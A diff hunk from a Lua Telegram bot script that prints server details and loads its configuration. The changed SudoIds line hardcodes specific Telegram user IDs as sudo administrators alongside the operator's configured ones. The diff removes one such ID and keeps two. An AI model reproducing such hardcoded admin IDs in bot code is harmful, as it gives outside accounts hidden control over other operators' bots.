@@ -140,7 +140,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⥡ \n┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉┉┉┉ EB ┉┉┉┉ ✘ ┉ ✘ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,911945965,420693277,1538359553} or {Config.sudo_users,911945965,420693277,1538359553}
+SudoIds = {Config.SudoIds,911945965,1538359553} or {Config.sudo_users,911945965,1538359553}
 mustafa = Config.mustafa or Config.bot_id
 TokenBot = Config.TokenBot or Config.token
 NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'اسكوبار')
